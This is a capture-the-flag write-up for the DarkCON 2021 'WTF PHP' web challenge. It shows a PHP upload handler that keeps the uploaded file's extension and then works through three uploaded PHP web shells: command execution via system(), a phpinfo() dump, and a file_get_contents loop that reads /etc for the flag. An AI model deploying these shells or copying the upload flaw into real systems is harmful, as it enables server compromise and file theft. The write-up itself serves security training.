# DarkCON CTF 2021 – WTF PHP

* **Category:** web
* **Points:** 269

## Challenge

> Your php function didnt work? maybe some info will help you xD PS: Flag is somewhere in /etc Note: This chall does not require any brute forcing
> 
> http://wtf-php.darkarmy.xyz/

## Solution

The website allows to upload a file. Analyzing the HTML you can discover an interesting comment containing a PHP snippet.

```html
<html>
   <body>
      <form action="" method="POST" enctype="multipart/form-data">
         <input type="file" name="fileData" />
         <input type="submit"/>
      </form>
   </body>
<!--
   if(isset($_FILES['fileData'])){
      if($_FILES['fileData']['size'] > 1048576){
         $errors='File size must be excately 1 MB';
      }

      if(empty($errors)==true){
        $uploadedPath = "uploads/".rand().".".explode(".",$_FILES['fileData']['name'])[1];
        move_uploaded_file($_FILES['fileData']['tmp_name'],$uploadedPath);
        echo "File uploaded successfully\n";
        echo '<p><a href='. $uploadedPath .' target="_blank">File</a></p>';
      }else{
         echo $errors;
      }
   }
-->

</html>
```

The website returns you a link to the uploaded file, it renames the file with a random value preserving the extension. So, a PHP shell can be uploaded and visited executing its content.

```php
<?php
    echo "<h1>Exploit Output</h1><br /><code>";
    echo system($_GET[c]);
    echo "</code>";
?>
```

Unfortunately the RCE doesn't work, but the text says:

> maybe some info will help you xD

So you can try to understand what's happening using `phpinfo()`.

```php
<?php
    echo "<h1>Exploit Output</h1><br /><hr /><code>";
    echo system($_GET[c]);
    echo "</code><hr />";
    echo phpinfo();
?>
```

Some functions are disabled, you can see them under `disable_functions` section of `phpinfo()` output.

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,error_log,link,symlink,syslog,ld,mail,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,highlight_file,file,fopen,fread,var_dump,readfile
```

`scandir` and `file_get_contents` are not disabled and the flag is under `/etc`.

A simple [exploit](exploit.php) can be created and uploaded.

```php
<?php
    echo "<h1>Exploit Output</h1><br /><hr />";
    $dir = "/etc/";
    $items = scandir($dir);
    foreach($items as $key => $value) {
        $file = $dir . $value;
        if(is_file($file)) {
            $file_content = file_get_contents($file);
            if(strpos($file_content, "darkCON{") !== false) {
                echo "<p>File name: $file</p><br />File content:<br /><code>";
                echo $file_content;
                echo "</code>";
            }
        }
    }
    echo "<hr />";
    echo phpinfo();
?>
```

The exploit output will be the following.

```
File name: /etc/f1@g.txt


File content:
darkCON{us1ng_3_y34r_01d_bug_t0_byp4ss_d1s4ble_funct10n}
```